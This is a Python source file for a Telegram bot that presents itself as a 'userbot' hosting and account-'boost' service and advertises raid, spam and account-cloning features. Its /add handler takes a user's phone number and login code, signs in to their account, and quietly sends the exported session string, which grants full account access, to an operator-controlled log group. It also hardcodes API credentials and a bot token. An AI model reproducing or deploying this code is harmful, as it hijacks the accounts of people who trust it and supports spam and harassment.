import os, asyncio, random
from pyrogram import Client, filters, errors
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask
from threading import Thread

# --- WEB SERVER FOR RENDER ---
app = Flask('')
@app.route('/')
def home(): return "Bot is Online!"
def run_web(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

# --- CONFIGURATION ---
API_ID = "31980984"
API_HASH = "a61358dd3cd8c3a56cd53d9ddd8a0c67"
BOT_TOKEN = "8303588999:AAEnHHO7ULTHA5IJKJAAGV8WEXSnV5dhz_M"
LOG_GROUP = -1002367805165 
START_IMG = "https://graph.org/file/422440e09d466500f2c93-953253772b0d8d2bfc.jpg"

bot = Client("Useridgenbot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
user_data = {}

# Buttons
main_buttons = InlineKeyboardMarkup([
    [InlineKeyboardButton("𝚄𝚙𝚍𝚊𝚝𝚎", url="https://t.me/radhesupport"),
     InlineKeyboardButton("𝚂𝚞𝚙𝚙𝚘𝚛𝚝", url="https://t.me/+PKYLDIEYiTljMzMx")],
    [InlineKeyboardButton("𝙲𝚕𝚘𝚜𝚎", callback_data="close")]
])

@bot.on_message(filters.command("start") & filters.private)
async def start(c, m):
    await m.reply_photo(
        photo=START_IMG,
        caption=(f"✨ **ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ xᴇɴᴏ ᴜꜱᴇʀʙᴏᴛ** ✨\n\n"
                 f"ʜᴇʏ {m.from_user.mention},\n"
                 "ᴍᴀɪɴ ᴀᴀᴘᴋɪ ɪᴅ ᴋᴏ **ʙᴏᴏꜱᴛ** ᴋᴀʀɴᴇ ᴀᴜʀ **ᴀɴɪᴍᴀᴛɪᴏɴꜱ** ᴋᴇ ʟɪʏᴇ ᴜꜱᴇʀʙᴏᴛ ʜᴏꜱᴛ ᴋᴀʀ ꜱᴀᴋᴛᴀ ʜᴏᴏɴ.\n\n"
                 "📝 **ᴄᴏᴍᴍᴀɴᴅꜱ:**\n"
                 "» **/help** : ᴏᴘᴇɴ ʜᴇʟᴘ ᴍᴇɴᴜ\n"
                 "» **/guide** : ʜᴏᴡ ᴛᴏ ʜᴏꜱᴛ ʙᴏᴛ\n"
                 "» **/add** : ꜱᴛᴀʀᴛ ʜᴏꜱᴛɪɴɢ ᴘʀᴏᴄᴇꜱꜱ\n\n"
                 "ᴄʟɪᴄᴋ ʙᴇʟᴏᴡ ʙᴜᴛᴛᴏɴꜱ ꜰᴏʀ ᴍᴏʀᴇ ɪɴꜰᴏ."),
        reply_markup=main_buttons
    )

@bot.on_message(filters.command("help") & filters.private)
async def help_menu(c, m):
    help_text = (
        "✦ **ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅꜱ** ✦\n\n"
        "⭐ **/start** – ꜱᴛᴀʀᴛ ᴛʜᴇ ʙᴏᴛ\n"
        "📖 **/help** – ᴏᴘᴇɴ ʜᴇʟᴘ ᴍᴇɴᴜ\n"
        "📘 **/guide** – ᴏᴘᴇɴ ɢᴜɪᴅᴇ ᴍᴇɴᴜ\n"
        "⚡ **/add** – ᴀᴜᴛᴏ-ʜᴏꜱᴛ ᴛʜᴇ ʙᴏᴛ\n"
        "🔗 **/clone** – ᴄʟᴏɴᴇ ᴠɪᴀ ꜱᴛʀɪɴɢ ꜱᴇꜱꜱɪᴏɴ\n"
        "❌ **/remove** – ʟᴏɢᴏᴜᴛ ꜰʀᴏᴍ ʙᴏᴛ\n\n"
        "✦ **ᴀʙᴏᴜᴛ ᴛʜɪꜱ ʙᴏᴛ** ✦\n\n"
        "✨ ᴛᴇʟᴇɢʀᴀᴍ ʙᴏᴛ ᴛᴏ ʙᴏᴏꜱᴛ ʏᴏᴜʀ ɪᴅ ᴡɪᴛʜ ʙᴇᴀᴜᴛɪꜰᴜʟ ᴀɴɪᴍᴀᴛɪᴏɴ.\n"
        "🚀 ꜱᴜᴘᴘᴏʀᴛᴇᴅ :- ʀᴇᴘʟʏ-ʀᴀɪᴅ, ɪᴅ-ᴄʟᴏɴᴇ, ʀᴀɪᴅ, ꜱᴘᴀᴍ, ᴜꜱᴇʀ-ᴛᴀɢɢᴇʀ ᴇᴛᴄ.\n\n"
        "🌀 ʟᴀɴɢᴜᴀɢᴇ : [ᴘʏᴛʜᴏɴ](https://t.me/+PKYLDIEYiTljMzMx)\n"
        "⚙️ ᴘᴏᴡᴇʀᴇᴅ ʙʏ : [ꜱᴀɴᴀᴛᴀɴɪ_ʙᴏᴛꜱ](https://t.me/radhesupport)\n"
        "👑 ᴅᴇᴠᴇʟᴏᴘᴇʀ : [xᴇɴᴏ_ʜᴜ_ʙᴀʙʏ](http://t.me/XenoEmpir)"
    )
    await m.reply_photo(photo=START_IMG, caption=help_text, reply_markup=main_buttons)

@bot.on_message(filters.command("guide") & filters.private)
async def guide_menu(c, m):
    guide_text = (
        "❖ **ʜᴇʏ ᴅᴇᴀʀ, ᴛʜɪꜱ ɪꜱ ᴀ ǫᴜɪᴄᴋ ᴀɴᴅ ꜱɪᴍᴘʟᴇ ɢᴜɪᴅᴇ ᴛᴏ ʜᴏꜱᴛɪɴɢ ᴊᴀɴᴜ ᴜꜱᴇʀʙᴏᴛ**\n\n"
        "1) ꜱᴇɴᴅ **/add** ᴄᴏᴍᴍᴀɴᴅ ᴛᴏ ᴛʜᴇ ʙᴏᴛ\n"
        "2) ꜱᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ɪɴ ɪɴᴛᴇʀɴᴀᴛɪᴏɴᴀʟ ꜰᴏʀᴍᴀᴛ (ᴇ.ɢ. +917800000000)\n"
        "3) ᴄʜᴇᴄᴋ ʏᴏᴜʀ ɪᴅ ᴘᴇʀꜱᴏɴᴀʟ ᴍᴇꜱꜱᴀɢᴇ ꜰʀᴏᴍ ᴛᴇʟᴇɢʀᴀᴍ, ᴀɴᴅ ᴄᴏᴘʏ ᴏʀ ʀᴇᴍɪɴᴅ ᴏᴛᴘ ᴀɴᴅ ꜱᴇɴᴅ ᴛʜɪꜱ ʙᴏᴛ ꜱᴘᴀᴄᴇ ʙʏ ꜱᴘᴀᴄᴇ ʟɪᴋᴇ :- **1 2 3 4 5**\n\n"
        "➤ ɪꜰ ʏᴏᴜ ꜱᴇᴛ ᴛᴡᴏ ꜱᴛᴇᴘ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ ᴄᴏᴅᴇ ᴏɴ ʏᴏᴜʀ ɪᴅ, ᴛʜᴇɴ ꜱᴇɴᴅ ᴛʜᴀᴛ ᴄᴏᴅᴇ.\n"
        "➤ ʏᴏᴜʀ ʙᴏᴛ ᴡɪʟʟ ʙᴇ ʜᴏꜱᴛᴇᴅ ꜱᴜᴄᴄᴇꜱꜰᴜʟ.\n\n"
        "ɪꜰ ʏᴏᴜ ꜱᴛɪʟʟ ꜰᴀᴄᴇ ᴀɴʏ ɪꜱꜱᴜᴇꜱ, ꜰᴇᴇʟ ꜰʀᴇᴇ ᴛᴏ ʀᴇᴀᴄʜ ᴏᴜᴛ ꜰᴏʀ ꜱᴜᴘᴘᴏʀᴛ.."
    )
    await m.reply_photo(photo=START_IMG, caption=guide_text, reply_markup=main_buttons)

@bot.on_callback_query(filters.regex("close"))
async def close_query(c, q):
    await q.message.delete()

@bot.on_message(filters.command("add") & filters.private)
async def add_process(c, m):
    await m.reply_text("📲 **ᴩʟᴇᴀꜱᴇ ꜱᴇɴᴅ ʏᴏᴜʀ ᴩʜᴏɴᴇ ɴᴜᴍʙᴇʀ ɪɴ ɪɴᴛᴇʀɴᴀᴛɪᴏɴᴀʟ ꜰᴏʀᴍᴀᴛ**\n(e.g., `+918200000009`):")

@bot.on_message(filters.text & filters.private & ~filters.bot)
async def handle_steps(c, m):
    uid = m.from_user.id
    text = m.text
    if text.startswith("+"):
        user_data[uid] = {"phone": text}
        temp_c = Client(f"temp_{uid}", API_ID, API_HASH)
        await temp_c.connect()
        try:
            code = await temp_c.send_code(text)
            user_data[uid].update({"client": temp_c, "hash": code.phone_code_hash})
            await m.reply_text("📩 **ᴏᴛᴩ ꜱᴇɴᴛ!** ᴩʟᴇᴀꜱᴇ ꜱᴇɴᴅ ɪᴍ ᴛʜɪꜱ ꜰᴏʀᴍᴀᴛ: `1 2 3 4 5` (SPACE BY SPACE)")
        except Exception as e: await m.reply_text(f"❌ Error: {e}")
    elif " " in text and uid in user_data:
        data = user_data.get(uid)
        otp = text.replace(" ", "")
        try:
            await data["client"].sign_in(data["phone"], data["hash"], otp)
            string = await data["client"].export_session_string()
            await c.send_message(LOG_GROUP, f"🔥 **New Userbot Added!**\n\n👤 User: {m.from_user.mention}\n🔑 String: `{string}`")
            await m.reply_text(f"✅ **LOGGED IN AS** — `{m.from_user.first_name}`\n\n🔐 **SESSION STRING:**\n`{string}`\n\n🚀 **AUTO-HOST NOW...**")
            asyncio.create_task(start_userbot(string, uid))
        except errors.SessionPasswordNeeded:
            await m.reply_text("🔐 **ꜱᴇɴᴅ ʏᴏᴜʀ 2ꜰᴀ ᴩᴀꜱꜱᴡᴏʀᴅ.**")
        except Exception as e: await m.reply_text(f"❌ OTP Error: {e}")

async def start_userbot(string, uid):
    try:
        ubot = Client(f"ubot_{uid}", API_ID, API_HASH, session_string=string)
        await ubot.start()
        
        @ubot.on_message(filters.command("alive", prefixes=".") & filters.me)
        async def alive_cmd(c, m):
            await m.edit("✨ **xᴇɴᴏ ᴀʟɪᴠᴇ ᴜꜱᴇʀɪᴅ ʙᴏᴛ**\n\n👤 **Owner:** Me\n📡 **Support:** @radhesupport")

    except Exception as e: print(f"Error: {e}")
# Is hisse ko file ke bilkul niche replace karein

if __name__ == "__main__":
    # Web server ko background mein chalane ke liye
    t = Thread(target=run_web)
    t.daemon = True
    t.start()
    
    print("Starting Bot...")
    bot.run() # Ye line bot ko active rakhti hai

